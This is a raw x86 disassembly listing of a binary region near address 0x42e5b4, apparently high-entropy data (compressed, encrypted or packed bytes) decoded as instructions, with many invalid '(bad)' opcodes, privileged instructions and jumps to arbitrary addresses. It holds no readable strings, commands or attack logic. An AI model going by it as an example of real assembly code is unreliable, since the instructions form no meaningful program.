  42e5b4:	and    DWORD PTR [ebx-0x7d],ebp
  42e5b7:	jns    0x42e551
  42e5b9:	stc    
  42e5ba:	pop    ebp
  42e5bb:	jle    0x42e5de
  42e5bd:	add    dl,BYTE PTR [edx]
  42e5bf:	cmp    BYTE PTR [ebp+0x5b],0x12
  42e5c3:	cmp    eax,DWORD PTR [edi-0x5b]
  42e5c6:	es int3 
  42e5c8:	mov    esp,0xa27ffd03
  42e5cd:	pshufw mm0,mm3,0xf
  42e5d1:	add    dl,BYTE PTR [esi]
  42e5d3:	enter  0x79ef,0xa0
  42e5d7:	jge    0x42e634
  42e5d9:	jns    0x42e5b8
  42e5db:	scas   eax,DWORD PTR es:[edi]
  42e5dc:	mov    ecx,0x8df1f6de
  42e5e1:	rol    bl,1
  42e5e3:	cli    
  42e5e4:	inc    eax
  42e5e5:	jle    0x42e614
  42e5e7:	cmp    eax,esp
  42e5e9:	push   0x8
  42e5eb:	sahf   
  42e5ec:	cmp    DWORD PTR [edi+0x0],esp
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	sub    eax,0x6764f6ba
  42e667:	icebp  
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	test   eax,0x6b059185
  42e673:	push   eax
  42e674:	dec    esi
  42e675:	xchg   esp,eax
  42e676:	test   DWORD PTR [edx-0x40],eax
  42e679:	ret    
  42e67a:	xadd   DWORD PTR ds:[eax+ebx*2],edx
  42e67f:	in     eax,0x5e
  42e681:	pop    es
  42e682:	pusha  
  42e683:	jp     0x42e63b
  42e685:	js     0x42e6b1
  42e687:	xor    BYTE PTR [ecx-0x777acada],0x84
  42e68e:	imul   ecx,DWORD PTR [ebp-0x5449fc6c],0xffffffdc
  42e695:	sbb    DWORD PTR [esi],ebp
  42e697:	or     ebp,DWORD PTR [ebx]
  42e699:	mov    DWORD PTR [ebp-0x501caf4],0x85881aaa
  42e6a3:	inc    ebp
  42e6a4:	cmp    cl,BYTE PTR [ecx-0x1727c62b]
  42e6aa:	sbb    al,0x1b
  42e6ac:	test   eax,0xa962f92e
  42e6b1:	sti    
  42e6b2:	out    dx,al
  42e6b3:	(bad)  
  42e6b4:	jle    0x42e679
  42e6b6:	bnd jmp 0x42e6a5
  42e6b9:	call   0x9a0645a0
  42e6be:	inc    edx
  42e6bf:	lods   al,BYTE PTR ds:[esi]
  42e6c0:	inc    esi
  42e6c1:	xor    al,bh
  42e6c3:	ret    0xd9d
  42e6c6:	std    
  42e6c7:	inc    ebp
  42e6c8:	cdq    
  42e6c9:	adc    ch,BYTE PTR [esi+0x487f9e08]
  42e6cf:	sti    
  42e6d0:	jo     0x42e6fc
  42e6d2:	add    al,0x24
  42e6d4:	shl    DWORD PTR [esi],1
  42e6d6:	dec    edi
  42e6d7:	or     eax,0xd54b4442
  42e6dc:	and    BYTE PTR [esi+ebx*4-0x7d5a1d0],bh
  42e6e3:	leave  
  42e6e4:	pusha  
  42e6e5:	push   es
  42e6e6:	(bad)  
  42e6e8:	dec    edi
  42e6e9:	int    0x15
  42e6eb:	es push cs
  42e6ed:	daa    
  42e6ee:	or     al,BYTE PTR ds:0x6ada4c1d
  42e6f4:	sub    esp,DWORD PTR [edi-0x1eb12bb4]
  42e6fa:	in     al,0xac
  42e6fc:	and    dl,ch
  42e6fe:	cmp    dl,BYTE PTR [edx-0x48]
  42e701:	xor    eax,0xf5cd27b6
  42e706:	test   bh,0x9a
  42e709:	inc    BYTE PTR [edx+0x419106b1]
  42e70f:	retf   
  42e710:	and    BYTE PTR [edx+edi*4],dh
  42e713:	and    dh,BYTE PTR [ecx+0x1e648c54]
  42e719:	pop    edx
  42e71a:	jo     0x42e6da
  42e71c:	jmp    0x9589c5cb
  42e721:	ins    BYTE PTR es:[edi],dx
  42e722:	scas   al,BYTE PTR es:[edi]
  42e723:	nop
  42e724:	repnz dec esp
  42e726:	sti    
  42e727:	in     eax,dx
  42e728:	mov    ecx,es
  42e72a:	and    eax,0xbf82b16e
  42e72f:	add    bh,al
  42e731:	jnp    0x42e71c
  42e733:	cdq    
  42e734:	sub    eax,0xe65d0de2
  42e739:	das    
  42e73a:	ja     0x42e6db
  42e73c:	scas   eax,DWORD PTR es:[edi]
  42e73d:	or     ebx,DWORD PTR [eax+ebp*8-0x2af810b5]
  42e744:	jge    0x42e747
  42e746:	sub    BYTE PTR [eax-0x2c4a8a81],ah
  42e74c:	cmp    BYTE PTR [edi-0xf],dh
  42e74f:	aaa    
  42e750:	adc    DWORD PTR [ebp+eiz*2-0x792b81fa],esp
  42e757:	popa   
  42e758:	(bad)  
  42e759:	or     al,BYTE PTR [edi+0xf5eabd5]
  42e75f:	push   es
  42e760:	std    
  42e761:	cli    
  42e762:	push   ss
  42e763:	mov    bl,0xfc
  42e765:	lock xor BYTE PTR [ecx],al
  42e768:	jbe    0x42e6f1
  42e76a:	xchg   edi,eax
  42e76b:	iret   
  42e76c:	push   esp
  42e76d:	dec    edi
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	ficom  DWORD PTR [esi+0x67920b0d]
  42e7e7:	repnz add DWORD PTR [eax],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	enter  0x5c75,0x3a
  42e7f2:	shl    DWORD PTR ds:0x97bcad70,cl
  42e7f8:	leave  
  42e7f9:	add    DWORD PTR [eax+ebx*1-0x574b7006],ecx
  42e800:	add    DWORD PTR [edi],ecx
  42e802:	adc    eax,0xeda5df94
  42e807:	mov    cl,0x2f
  42e809:	push   cs
  42e80a:	or     BYTE PTR [esi-0x50a20bc4],bh
  42e810:	(bad)  
  42e811:	mov    ds:0x13875380,eax
  42e816:	dec    esp
  42e817:	push   0x2
  42e819:	push   cs
  42e81a:	mov    WORD PTR [edx+0x2],?
  42e81d:	add    BYTE PTR [ecx+edx*2-0x18],bh
  42e821:	xchg   edi,eax
  42e822:	arpl   WORD PTR [ebx+0x4c],cx
  42e825:	aam    0x70
  42e827:	mov    esp,0x3b0966f7
  42e82c:	add    al,0x54
  42e82e:	ret    
  42e82f:	out    dx,eax
  42e830:	cmc    
  42e831:	call   0x4e4752ab
  42e836:	cmp    dh,al
  42e838:	and    eax,0xa5ff5a11
  42e83d:	retf   0x5c5a
  42e840:	or     BYTE PTR [ebx+0xe],ah
  42e843:	or     BYTE PTR [ecx+ecx*8],cl
  42e846:	xchg   DWORD PTR [ebx+0x337995a],esi
  42e84c:	sti    
  42e84d:	jecxz  0x42e840
  42e84f:	repnz pop ebp
  42e851:	outs   dx,BYTE PTR ds:[esi]
  42e852:	mov    ah,0xce
  42e854:	mov    eax,0x1d42cd8
  42e859:	je     0x42e7f9
  42e85b:	je     0x42e82d
  42e85d:	icebp  
  42e85e:	(bad)  
  42e85f:	fidiv  DWORD PTR [esi+0x1e8c74ca]
  42e865:	ret    0xf17c
  42e868:	adc    al,BYTE PTR [eax+0x4a]
  42e86b:	cli    
  42e86c:	test   eax,0xb218eda
  42e871:	cmp    eax,0xc6d19bf2
  42e876:	sbb    al,0x91
  42e878:	mov    ch,0x94
  42e87a:	sub    DWORD PTR [ebp+0x68],0xff502b9a
  42e881:	inc    esi
  42e882:	pushf  
  42e883:	mov    eax,ds:0xb0285272
  42e888:	cld    
  42e889:	sub    esp,ebp
  42e88b:	add    al,0x48
  42e88d:	inc    eax
  42e88e:	in     eax,dx
  42e88f:	ds test eax,0xba2d9f65
  42e895:	jl     0x42e878
  42e897:	push   0x7f
  42e899:	(bad)  
  42e89b:	jns    0x42e8fe
  42e89d:	aas    
  42e89e:	dec    esp
  42e89f:	ds push ecx
  42e8a1:	fwait
  42e8a2:	xor    edx,edx
  42e8a4:	cld    
  42e8a5:	mov    ds:0x7025bdf,eax
  42e8ab:	xchg   ebx,eax
  42e8ac:	(bad)  
  42e8ad:	in     al,0xda
  42e8af:	lods   al,BYTE PTR ds:[esi]
  42e8b0:	mov    eax,0xc75ce699
  42e8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e8b6:	pop    edi
  42e8b8:	push   0x7a
  42e8ba:	push   DWORD PTR [ebp+0xd]
  42e8bd:	pop    es
  42e8be:	in     al,0x15
  42e8c0:	pop    esi
  42e8c1:	lahf   
  42e8c2:	outs   dx,DWORD PTR ds:[esi]
  42e8c3:	loopne 0x42e8a0
  42e8c5:	push   eax
  42e8c6:	mov    bh,BYTE PTR [ebx-0x7b]
  42e8c9:	aas    
  42e8ca:	clc    
  42e8cb:	int    0x4b
  42e8cd:	retf   0x2670
  42e8d0:	sbb    bl,dh
  42e8d2:	jmp    0x42e8d2
  42e8d4:	mov    ecx,0xbf492be3
  42e8d9:	jb     0x42e877
  42e8db:	shl    BYTE PTR [eax+0x310ca80c],1
  42e8e1:	fcomp  QWORD PTR [esi]
  42e8e3:	pop    ds
  42e8e4:	mov    bl,0x9e
  42e8e6:	(bad)  
  42e8e7:	xlat   BYTE PTR ds:[ebx]
  42e8e8:	enter  0x3ea7,0x97
  42e8ec:	adc    DWORD PTR [ebx],edx
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x5dc07d5]
  42e963:	ret    0xc17c
  42e966:	repz add DWORD PTR [bx+si],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	and    eax,0xf514105c
  42e973:	idiv   DWORD PTR [esi-0x64]
  42e976:	xchg   esp,eax
  42e977:	pusha  
  42e978:	hlt    
  42e979:	gs push 0xffffffdc
  42e97c:	inc    edx
  42e97d:	lds    eax,FWORD PTR [ebx+0x35]
  42e980:	lds    esi,FWORD PTR [ecx]
  42e982:	jbe    0x42e9e7
  42e984:	push   esi
  42e985:	cs ins BYTE PTR es:[edi],dx
  42e987:	or     DWORD PTR [esp+eiz*4+0x4f],edi
  42e98b:	into   
  42e98c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e98d:	cmp    al,BYTE PTR [ebx-0x56]
  42e990:	cmp    DWORD PTR [esi+0x50],ebp
  42e993:	add    DWORD PTR [edi],ebp
  42e995:	popf   
  42e996:	sbb    cl,dh
  42e998:	xlat   BYTE PTR ds:[ebx]
  42e999:	adc    al,BYTE PTR [ebx-0x2d717323]
  42e99f:	in     al,0x33
  42e9a1:	or     eax,0x8d03cbdb
  42e9a6:	xchg   edi,eax
  42e9a7:	(bad)  
  42e9a8:	das    
  42e9a9:	sbb    ebp,0x6
  42e9ac:	or     ecx,edi
  42e9ae:	mov    dh,BYTE PTR [ebp-0x55]
  42e9b1:	jge    0x42ea27
  42e9b3:	mov    bl,cl
  42e9b5:	xor    eax,0x898ecd93
  42e9ba:	mov    ds:0xac91950,eax
  42e9bf:	jno    0x42ea2e
  42e9c1:	xchg   edi,eax
  42e9c2:	cmp    dh,bl
  42e9c4:	jp     0x42e984
  42e9c6:	xor    dh,BYTE PTR [edi-0x31]
  42e9c9:	loop   0x42e96d
  42e9cb:	mov    ecx,0xfd0048bf
  42e9d0:	xor    ah,dl
  42e9d2:	mov    eax,0x57a37a9f
  42e9d7:	and    eax,0x728747e5
  42e9dc:	cmp    DWORD PTR [ebx-0x3b],ebx
  42e9df:	lock or edi,DWORD PTR [eax]
  42e9e2:	fs inc edx
  42e9e4:	mov    ds:0x980e7641,eax
  42e9e9:	sti    
  42e9ea:	je     0x42ea48
  42e9ec:	push   ebx
  42e9ed:	sbb    eax,0x44811f2a
  42e9f2:	mov    eax,ds:0x8422a91b
  42e9f7:	jmp    0x42ea1e
  42e9f9:	xor    eax,0x5385127b
  42e9fe:	pop    es
  42e9ff:	sbb    al,0x88
  42ea01:	fdiv   QWORD PTR [ebx+esi*1]
  42ea04:	adc    al,0xda
  42ea06:	cs pop eax
  42ea08:	push   edi
  42ea09:	popf   
  42ea0a:	outs   dx,DWORD PTR ds:[esi]
  42ea0b:	rcr    DWORD PTR [ebx-0x2],cl
  42ea0e:	jle    0x42ea0c
  42ea10:	mov    ds:0x10d052bf,eax
  42ea15:	mul    eax
  42ea17:	cwde   
  42ea18:	imul   DWORD PTR [eax]
  42ea1a:	sub    DWORD PTR [edx],edi
  42ea1c:	jp     0x42ea99
  42ea1e:	push   es
  42ea1f:	mov    edi,0xdb96ca53
  42ea24:	mov    ds:0xe64cc5e6,al
  42ea29:	xchg   BYTE PTR ds:0xd0b9bea3,cl
  42ea2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea30:	pop    esp
  42ea31:	ror    DWORD PTR [ebp+ecx*1+0x23],cl
  42ea35:	fdiv   QWORD PTR [ebx]
  42ea37:	sub    BYTE PTR [ebx],bl
  42ea39:	lods   eax,DWORD PTR ds:[esi]
  42ea3a:	hlt    
  42ea3b:	push   eax
  42ea3c:	xor    dl,dh
  42ea3e:	add    eax,DWORD PTR [ebp-0x693352a8]
  42ea44:	mov    ecx,0x810c9ab7
  42ea49:	mov    dl,0x1b
  42ea4b:	xchg   ecx,eax
  42ea4c:	xchg   esi,eax
  42ea4d:	inc    ecx
  42ea4e:	push   esp
  42ea4f:	inc    edx
  42ea50:	jmp    0xb6913335
  42ea55:	sub    bh,BYTE PTR [ebx-0x50557949]
  42ea5b:	test   al,0xae
  42ea5d:	inc    edi
  42ea5f:	xor    BYTE PTR [ecx],0xbd
  42ea62:	sti    
  42ea63:	inc    ecx
  42ea64:	dec    eax
  42ea65:	push   cs
  42ea66:	jo     0x42e9fc
  42ea68:	outs   dx,BYTE PTR ds:[esi]
  42ea69:	mov    ds:0x58b3062d,eax
	...
  42ead6:	in     eax,0xba
  42ead8:	xchg   edx,eax
  42ead9:	jecxz  0x42eaba
  42eadb:	jmp    0x42ead2
  42eadd:	mov    esi,0x66dc160c
  42eae2:	ins    BYTE PTR es:[edi],dx
  42eae3:	lahf   
  42eae4:	jne    0x42eb5e
  42eae6:	addr16 hlt 
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	push   ds
  42eaef:	ss pop ds
  42eaf1:	cmp    ch,BYTE PTR [edx-0x6c]
  42eaf4:	add    al,0x2b
  42eaf6:	iret   
  42eaf7:	mov    ch,0xae
  42eaf9:	and    al,0xf9
  42eafb:	cwde   
  42eafc:	inc    edi
  42eafd:	push   eax
  42eafe:	jmp    0x42eaf3
  42eb00:	mov    esp,0x340540ad
  42eb05:	pop    ebx
  42eb06:	es lahf 
  42eb08:	fs pushf 
  42eb0a:	xor    edx,DWORD PTR [edx]
  42eb0c:	pop    esp
  42eb0d:	sub    al,0xd5
  42eb0f:	push   esi
  42eb10:	scas   al,BYTE PTR es:[edi]
  42eb11:	sub    edx,edi
  42eb13:	adc    DWORD PTR [edi+0x28],ecx
  42eb16:	mov    bl,0xf1
  42eb18:	fidiv  WORD PTR [eax+0x12]
  42eb1b:	adc    ah,BYTE PTR [ecx]
  42eb1d:	push   ebx
  42eb1e:	or     eax,0x94dfe008
  42eb23:	inc    esp
  42eb24:	pop    ds
  42eb25:	retf   0x87c7
  42eb28:	test   DWORD PTR [ebx],edx
  42eb2a:	(bad)  
  42eb2b:	mov    al,0xc8
  42eb2d:	xor    al,0xb2
  42eb2f:	jns    0x42eb79
  42eb31:	push   ds
  42eb32:	add    eax,0x1eebc366
  42eb37:	xchg   BYTE PTR [eax+0x35d28984],ah
  42eb3d:	sbb    dl,BYTE PTR [ecx-0x11a3460f]
  42eb43:	(bad)  
  42eb44:	in     eax,0x1a
  42eb46:	lods   eax,DWORD PTR ds:[esi]
  42eb47:	pop    edx
  42eb48:	sbb    bl,cl
  42eb4a:	pushf  
  42eb4b:	or     al,0x62
  42eb4d:	add    al,0xfe
  42eb4f:	inc    edi
  42eb50:	cdq    
  42eb51:	int    0xc4
  42eb53:	call   0x89f1:0x71ab83f8
  42eb5a:	cld    
  42eb5b:	mov    eax,ds:0x70dfb8d4
  42eb60:	jge    0x42eb17
  42eb62:	jb     0x42eb5b
  42eb64:	repnz mov edi,0xae4e7c91
  42eb6a:	xor    BYTE PTR [edi-0x50c31cfe],dh
  42eb70:	aam    0xa0
  42eb72:	xchg   ebp,eax
  42eb73:	dec    ecx
  42eb74:	shr    BYTE PTR [eax+0x5c],1
  42eb77:	mov    BYTE PTR [ecx-0x3c],dl
  42eb7a:	mov    esp,0x17f3ef30
  42eb7f:	and    esp,DWORD PTR ds:0xb9e2329b
  42eb85:	bound  ecx,QWORD PTR [edx]
  42eb87:	push   ebp
  42eb88:	mov    cs,WORD PTR [esi]
  42eb8a:	adc    eax,0xa9fe6d09
  42eb8f:	pop    edx
  42eb90:	add    cl,BYTE PTR [ebx+ebx*2+0x4a2df857]
  42eb97:	xchg   edx,eax
  42eb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb99:	fwait
  42eb9a:	push   edi
  42eb9b:	repz arpl WORD PTR [edi],bx
  42eb9e:	or     BYTE PTR [edx-0x17f0b82c],0xc1
  42eba5:	out    0x23,eax
  42eba7:	(bad)  
  42eba8:	(bad)  
  42eba9:	rcr    DWORD PTR [ecx-0xb],0x80
  42ebad:	xchg   esp,eax
  42ebae:	push   eax
  42ebaf:	fmul   QWORD PTR ds:0x65eb386c
  42ebb5:	and    BYTE PTR [ebx],0x79
  42ebb8:	stc    
  42ebb9:	push   si
  42ebbb:	cmp    ah,BYTE PTR [ecx+ebp*1-0x69]
  42ebbf:	pusha  
  42ebc0:	pushf  
  42ebc1:	call   0xa270:0x5f540987
  42ebc8:	mov    ds:0x877f591c,al
  42ebcd:	jmp    0x3cb3:0x77db0cfd
  42ebd4:	(bad)  
  42ebd5:	sti    
  42ebd6:	sub    edi,0x16411dba
  42ebdc:	pusha  
  42ebdd:	stos   BYTE PTR es:[edi],al
  42ebde:	stos   BYTE PTR es:[edi],al
  42ebdf:	xchg   esi,eax
  42ebe0:	jns    0x42eb67
  42ebe2:	in     al,0x19
  42ebe4:	mov    bl,0x38
  42ebe6:	fisttp DWORD PTR [esi+0x1ac7812d]
  42ebec:	dec    eax
  42ebed:	das    
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sbb    DWORD PTR [edi],0x67dad442
  42ec67:	cmc    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	cmp    cl,cl
  42ec70:	mov    WORD PTR [edx+0x7c153ae],fs
  42ec76:	ret    0x568
  42ec79:	ret    0xb561
  42ec7c:	push   esi
  42ec7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec7e:	outs   dx,DWORD PTR ds:[esi]
  42ec7f:	mov    al,BYTE PTR [ebx+0x24]
  42ec82:	(bad)  
  42ec83:	std    
  42ec84:	ja     0x42ec41
  42ec86:	imul   edx,DWORD PTR [ecx+0x5],0x9dfe8768
  42ec8d:	pop    edx
  42ec8e:	popa   
  42ec8f:	mov    ds:0x58be2050,eax
  42ec94:	test   DWORD PTR [edi],ebx
  42ec96:	pushf  
  42ec97:	mov    eax,0x1cf017d2
  42ec9c:	outs   dx,BYTE PTR ds:[esi]
  42ec9d:	loop   0x42ecce
  42ec9f:	stc    
  42eca0:	mov    BYTE PTR [ebx-0x76],dh
  42eca3:	cmp    BYTE PTR [esp+ebp*4-0x2878f208],bl
  42ecaa:	mov    esi,0x189a8602
  42ecaf:	dec    edi
  42ecb0:	and    edx,DWORD PTR [ecx+0x54ef2f1a]
  42ecb6:	fistp  WORD PTR [ebx]
  42ecb8:	mov    ds:0x2b2889e5,al
  42ecbd:	dec    edi
  42ecbe:	ret    0xa99
  42ecc1:	xor    dl,BYTE PTR [ecx]
  42ecc3:	fidiv  WORD PTR [eax]
  42ecc5:	mov    edx,0x876995b1
  42ecca:	jl     0x42ec90
  42eccc:	jmp    0x2c4d889c
  42ecd1:	jmp    0xbb24:0x2228b9b1
  42ecd8:	scas   al,BYTE PTR es:[edi]
  42ecd9:	xor    cl,BYTE PTR [eax+0xf70cafb]
  42ecdf:	ja     0x42ed30
  42ece1:	sub    eax,0x5dcc63c2
  42ece6:	or     eax,0xb3fea644
  42eceb:	mov    BYTE PTR [edi],dl
  42eced:	aaa    
  42ecee:	bound  ebx,QWORD PTR [ecx-0x27886874]
  42ecf4:	int    0x25
  42ecf6:	mov    ss,WORD PTR [esi+ebp*1+0x62]
  42ecfa:	cmp    al,0x50
  42ecfc:	pop    ebx
  42ecfd:	jge    0x42ed0e
  42ecff:	outs   dx,DWORD PTR cs:[esi]
  42ed01:	cli    
  42ed02:	mov    edi,0xc6027dee
  42ed07:	push   ss
  42ed08:	sub    eax,0x70e2e328
  42ed0d:	lods   al,BYTE PTR ds:[esi]
  42ed0e:	mov    ecx,0x4214b4a1
  42ed13:	inc    eax
  42ed14:	sti    
  42ed15:	sbb    ch,ch
  42ed17:	jne    0x42ed7f
  42ed19:	fsub   DWORD PTR [esi-0x75]
  42ed1c:	icebp  
  42ed1d:	mov    eax,ds:0xd14f15c0
  42ed22:	add    BYTE PTR [ebx-0x6362baeb],bh
  42ed28:	jb     0x42ed4b
  42ed2a:	stc    
  42ed2b:	push   esp
  42ed2c:	loope  0x42ecf8
  42ed2e:	(bad)  
  42ed2f:	test   al,0xdd
  42ed31:	mov    ebp,0x6a460b0
  42ed36:	pop    edx
  42ed37:	pop    eax
  42ed38:	in     eax,0x6c
  42ed3a:	clc    
  42ed3b:	leave  
  42ed3c:	xchg   ebp,eax
  42ed3d:	(bad)  
  42ed3e:	out    dx,al
  42ed3f:	shr    BYTE PTR [esi+ebp*1+0xd],0xe7
  42ed44:	mov    eax,?
  42ed46:	int    0x8c
  42ed48:	iret   
  42ed49:	fidivr DWORD PTR [esi-0x13c5a0e1]
  42ed4f:	ret    0x2c7e
  42ed52:	jg     0x42ece3
  42ed54:	mov    dl,0x1
  42ed56:	push   ecx
  42ed57:	rcl    DWORD PTR [ebx-0x80],cl
  42ed5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed5b:	or     dl,BYTE PTR [edx]
  42ed5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed5e:	mov    dl,0x9d
  42ed60:	adc    ah,cl
  42ed62:	fxch   st(3)
  42ed64:	fisttp WORD PTR [eax-0x5a]
  42ed67:	in     al,0xf9
  42ed69:	push   es
  42ed6a:	clc    
  42ed6b:	out    dx,eax
  42ed6c:	sbb    eax,0x8b
	...
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42eddd:	mul    bl
  42eddf:	xor    al,BYTE PTR [ebp-0x4e881f5e]
  42ede5:	loopne 0x42ee4e
  42ede7:	test   BYTE PTR [ecx],0x0
  42edea:	add    BYTE PTR [ecx],al
  42edec:	add    BYTE PTR [eax],al
  42edee:	out    dx,al
  42edef:	scas   eax,DWORD PTR es:[edi]
  42edf0:	bound  esi,QWORD PTR [ecx]
  42edf2:	mov    esp,0x34e73ab7
  42edf7:	scas   al,BYTE PTR es:[edi]
  42edf8:	mov    ds:0x2da781d,eax
  42edfd:	cwde   
  42edfe:	inc    ebx
  42edff:	xchg   ebx,eax
  42ee00:	fiadd  WORD PTR [edi]
  42ee02:	es div dh
  42ee05:	push   0xfffffff4
  42ee07:	cmp    ecx,edi
  42ee09:	loop   0x42ee8a
  42ee0b:	mov    ds,WORD PTR [edx+0x44]
  42ee0e:	iret   
  42ee0f:	out    0x16,eax
  42ee11:	push   esp
  42ee12:	xor    al,0x84
  42ee14:	sti    
  42ee15:	ret    0xf16c
  42ee18:	xor    DWORD PTR [esi],0x7a
  42ee1b:	mov    dl,BYTE PTR [ebp-0x7d]
  42ee1e:	push   ds
  42ee1f:	xchg   ebx,eax
  42ee20:	pop    ss
  42ee21:	mov    DWORD PTR [edx],edx
  42ee23:	dec    BYTE PTR [esi+0x7e]
  42ee26:	(bad)  
  42ee27:	(bad)  
  42ee28:	fs inc esp
  42ee2a:	hlt    
  42ee2b:	idiv   DWORD PTR [ecx+0x2539a77e]
  42ee31:	cli    
  42ee32:	inc    eax
  42ee33:	mov    edi,0xfb9a0553
  42ee38:	add    eax,0x96a87102
  42ee3d:	xlat   BYTE PTR ds:[ebx]
  42ee3e:	pop    ss
  42ee3f:	xchg   ecx,eax
  42ee40:	cmp    BYTE PTR [esi-0x745f5e91],dh
  42ee46:	repz adc edx,DWORD PTR [ecx+0x46721d03]
  42ee4d:	cwde   
  42ee4e:	data16 popfw 
  42ee51:	sub    al,BYTE PTR [esi+0xe2da5de]
  42ee57:	shr    DWORD PTR [edi+0x65],1
  42ee5a:	popf   
  42ee5b:	fstp   TBYTE PTR [eax]
  42ee5d:	rcl    BYTE PTR [esi],0x88
  42ee60:	add    ecx,esi
  42ee62:	mov    DWORD PTR [ecx+0x61],edx
  42ee65:	fidiv  WORD PTR [edi]
  42ee67:	lock add eax,0xb4d537aa
  42ee6d:	nop
  42ee6e:	ret    
  42ee6f:	dec    eax
  42ee70:	xor    DWORD PTR [esi+0x72],ebx
  42ee73:	cli    
  42ee74:	loop   0x42eea8
  42ee76:	jmp    0x42ee9a
  42ee78:	test   DWORD PTR [esi-0x35de7704],eax
  42ee7e:	stc    
  42ee7f:	xchg   ebp,eax
  42ee80:	int3   
  42ee81:	adc    BYTE PTR [ebx+0x22],dl
  42ee84:	jns    0x42ee41
  42ee86:	add    DWORD PTR [ebx-0x47],edi
  42ee89:	pop    es
  42ee8a:	sub    al,0xbc
  42ee8c:	mov    bh,0xc7
  42ee8e:	mov    ebx,0xc20ab66b
  42ee93:	push   ecx
  42ee94:	hlt    
  42ee95:	jmp    0x42eedc
  42ee97:	daa    
  42ee98:	vunpcklps xmm0,xmm5,XMMWORD PTR [esi+0x13]
  42ee9d:	dec    esi
  42ee9e:	ror    BYTE PTR [ebx+0x4],0xa0
  42eea2:	sahf   
  42eea3:	mov    fs,WORD PTR [edx-0x31]
  42eea6:	shl    DWORD PTR [edi],1
  42eea8:	mov    eax,ds:0x336b8d15
  42eead:	sbb    cl,BYTE PTR [esi+edx*4]
  42eeb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeb1:	or     edx,DWORD PTR [ebp-0x17]
  42eeb4:	inc    edx
  42eeb5:	ret    0xd05b
  42eeb8:	lods   eax,DWORD PTR ds:[esi]
  42eeb9:	xor    ebp,DWORD PTR [ebp+0x61162113]
  42eebf:	and    al,0x5a
  42eec1:	add    eax,0xc7e94607
  42eec6:	(bad)  
  42eec7:	retf   0x29ff
  42eeca:	push   ss
  42eecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eecd:	jmp    0xf6bd1cc1
  42eed2:	cmp    DWORD PTR [edx+0x585e64a8],ebp
  42eed8:	mov    ecx,0x83677795
  42eedd:	mov    edx,0x1bdb4b80
  42eee2:	out    0xbc,al
  42eee4:	std    
  42eee5:	ret    0x1b4a
  42eee8:	sbb    eax,0x199292e1
  42eeed:	lds    eax,FWORD PTR [eax]
	...
  42ef53:	add    BYTE PTR [eax],al
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	bound  ebp,QWORD PTR [ebp+0x23]
  42ef65:	and    esp,DWORD PTR [edi-0x9]
  42ef68:	add    DWORD PTR [eax],eax
  42ef6a:	add    BYTE PTR [ecx],al
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	ret    0x8d02
  42ef71:	ficom  WORD PTR [ebp+ebx*8-0xa]
  42ef75:	ins    BYTE PTR es:[edi],dx
  42ef76:	fs push edi
  42ef78:	outs   dx,DWORD PTR ds:[esi]
  42ef79:	jne    0x42ef42
  42ef7b:	nop
  42ef7c:	or     eax,0x233b308f
  42ef81:	rcr    BYTE PTR [ebp-0x41],cl
  42ef84:	xor    al,0x1e
  42ef86:	jo     0x42eff9
  42ef88:	pop    es
  42ef89:	mov    esp,0xcbccae10
  42ef8e:	adc    eax,0xb9757a6e
  42ef93:	xor    bh,dh
  42ef95:	push   0xffffffe9
  42ef97:	xchg   DWORD PTR [eax-0x20f099e],edx
  42ef9d:	jmp    0x2df4:0x84dbc3fd
  42efa4:	inc    edx
  42efa5:	lock in al,0x1e
  42efa8:	mov    bl,0xbe
  42efaa:	lahf   
  42efab:	sbb    ebp,DWORD PTR [ecx+0x34e1f693]
  42efb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efb2:	and    bh,BYTE PTR [edi-0x26]
  42efb5:	inc    eax
  42efb6:	test   al,0x6a
  42efb8:	dec    ebp
  42efb9:	push   ds
  42efba:	inc    esp
  42efbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efbc:	ins    BYTE PTR es:[edi],dx
  42efbd:	pop    ss
  42efbe:	inc    ecx
  42efbf:	ss cs cmc 
